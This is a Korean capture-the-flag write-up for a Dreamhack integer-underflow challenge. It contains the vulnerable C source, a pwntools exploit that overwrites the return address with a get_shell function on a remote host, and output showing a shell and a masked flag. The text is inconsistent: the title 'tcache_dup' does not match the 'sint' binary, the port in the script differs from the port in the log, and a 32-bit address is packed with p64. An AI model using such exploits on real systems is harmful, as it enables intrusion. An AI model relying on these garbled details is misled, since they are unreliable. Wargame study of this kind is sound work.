# tcache_dup

- [문제 페이지](https://dreamhack.io/wargame/challenges/25)

## 문제 해설
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char buf[256];
    int size;

    initialize();

    signal(SIGSEGV, get_shell);

    printf("Size: ");
    scanf("%d", &size);

    if (size > 256 || size < 0)
    {
        printf("Buffer Overflow!\n");
        exit(0);
    }

    printf("Data: ");
    read(0, buf, size - 1);

    return 0;
}
```

해당 코드를 보면, size를 읽어 size의 -1을 read하고 있다.

이때, size는 buf의 사이즈 이상으로 정할 수 없기 때문에 size를 buf의 사이즈 이상으로 하여 bof를 일으킬 수 없다.

하지만, read의 size는 unsigned형태로 들어가기 때문에 size에 0을 넣으면, rbp-0x8위치에 있는, ret주소를 get_shell 주소로 변조할 수있다.

이를 파이썬 코드로 작성하면

```python
from pwn import *

#p = process("./sint")
p = remote("host1.dreamhack.games", 18484)

p.sendlineafter(b"Size: ", b'0')
p.sendlineafter(b'Data: ', b'a'*0x100 + p64(0x8048659))

p.interactive()
```
이고, 이를 실행하면

```
[+] Opening connection to host1.dreamhack.games on port 13825: Done
[*] Switching to interactive mode
$ ls
flag
sint
$ cat flag
DH{**************************************************************************}
$ 
```

잘 실행됨을 알 수 있다.

![success](image.png)